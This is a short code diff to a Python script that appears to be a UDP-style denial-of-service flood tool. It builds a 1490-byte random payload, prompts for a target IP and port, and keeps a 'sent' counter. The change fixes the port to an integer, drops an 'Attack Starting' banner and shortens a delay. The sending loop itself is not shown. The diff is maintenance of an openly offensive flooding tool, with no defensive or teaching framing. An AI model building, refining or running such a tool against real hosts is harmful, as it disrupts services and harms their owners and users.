@@ -19,12 +19,10 @@ bytes = random._urandom(1490)
 #############
 
 ip = input("IP Target : ")
-port = input("Port       : ")
+port = int(input("Port       : "))
 
-os.system("clear")
-os.system("figlet Attack Starting")
 print("[                    ] 0% ")
-time.sleep(5)
+time.sleep(1)
 print("[====================] 100%")
 time.sleep(3)
 sent = 0
